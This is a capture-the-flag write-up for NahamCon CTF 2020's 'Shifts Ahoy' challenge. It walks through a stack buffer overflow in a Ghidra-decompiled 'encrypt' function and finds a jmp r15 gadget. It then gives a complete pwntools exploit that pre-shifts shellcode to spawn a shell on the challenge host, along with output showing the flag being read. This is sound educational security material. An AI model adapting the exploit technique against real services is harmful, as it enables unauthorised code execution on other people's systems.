# NahamCon CTF 2020

## Shifts Ahoy

> 100
>
> I created super advanced encryption software for us to communicate securely.
>
> Connect here:</br>
> `nc jh2i.com 50015`</br>
>
> [`shifts-ahoy`](shifts-ahoy)

Tags: _pwn_ _x86-64_ _shellcode_ _rop_ _bof_


## Summary

Buffer overflow to ROP your shellcode.  The ROP is tight, 7-bytes!


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

Almost nothing.  Choose your own adventure.


### Decompile with Ghidra

```c
void encrypt(char *__block,int __edflag)

{
  size_t sVar1;
  undefined4 in_register_00000034;
  char local_58 [72];
  int local_10;
  int local_c;
  
  printf("Enter the message: ",CONCAT44(in_register_00000034,__edflag));
  fgets(local_58,0x60,stdin);
  sVar1 = strlen(local_58);
  local_c = (int)sVar1;
  if (0x40 < (int)sVar1) {
    local_c = 0x40;
  }
  local_10 = 0;
  while (local_10 < local_c) {
    local_58[local_10] = local_58[local_10] + '\r';
    local_10 = local_10 + 1;
  }
  printf("\nEncrypted Message: %s\n",local_58);
  return;
}
```

The `fgets` buffer overflow vulnerability is in the `encrypt` function, and there is just enough overflow to work with.  `local_58` is `0x58` bytes from the return address and `fgets` is only going to read `0x60` bytes.  That leaves 8 bytes (7 if you count that `fgets` will replace the last byte with `0x00`, fortunately it needs to be zero), just enough to overwrite the return address.

_But with what?_

Looking at the `encrypt` disassembly:

```
        004012e1 49 89 e7        MOV        R15,RSP
        004012e4 90              NOP
        004012e5 c9              LEAVE
        004012e6 c3              RET
```

Just before `encrypt` returns the stack pointer is copied (moved) to R15, which happens to have the address of `local_58` (check with GDB), so just send some shellcode and then `jmp r15`.  _Right?_

`jmp r15` check:

```python
>>> from pwn import *
>>> binary = ELF('shifts-ahoy')
[*] '/pwd/datajerk/nahamconctf2020/shifts/shifts-ahoy'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
>>> context.update(arch='amd64',os='linux')
>>> jmp_r15 = list(binary.search(asm('jmp r15')))[0]
>>> print("jmp r15",hex(jmp_r15))
jmp r15 0x4011cd
```

Good.

There's one last detail, the "encrypt" function, "encrypts" the first `0x40` bytes of our input to `fgets`, so we'll have to "decrypt" our payload so that when "encrypted" we get plaintext shellcode.


## Exploit

```python
#!/usr/bin/python3

from pwn import *

#p = process('./shifts-ahoy')
p = remote('jh2i.com', 50015)

p.sendlineafter('> ','1')
p.recvuntil('Enter the message: ')

binary = ELF('shifts-ahoy')
context.update(arch='amd64',os='linux')
shellcode = asm(shellcraft.sh())
jmp_r15 = list(binary.search(asm('jmp r15')))[0]
print("jmp r15",hex(jmp_r15))

payload = b''
for i in range(len(shellcode)):
    payload += bytes([(shellcode[i] - ord('\r')) & 0xff])

payload += (0x58 - len(payload)) * b'A'
payload += p64(jmp_r15)

p.sendline(payload)
p.interactive()
```

After obtinaing shellcode from pwntools and the address of `jmp r15`, the shellcode will need to be "decrypted", IOW, subtract `\r` from each byte since `encrypt` will just add it back, then pad out to `0x58` bytes (distance from return address), and set the return address to the address of `jmp r15`.

Output:

```
# ./exploit.py
[+] Opening connection to jh2i.com on port 50015: Done
[*] '/pwd/datajerk/nahamconctf2020/shifts/shifts-ahoy'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
jmp r15 0x4011cd
[*] Switching to interactive mode

Encrypted Message: jhH\xb8/bin///sPH\x89\xe7hri\x814$1\xf6V^H\xe6VH\x89\xe61\xd2j;X\x0fNNNNNNNNNNNNNNNNAAAAAAAA@
$ id
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
$ ls
flag.txt
shifts-ahoy
$ cat flag.txt
flag{captain_of_the_rot13_ship}
```

So `\r` is the 13th ASCII character, _rot?_, anyway, done.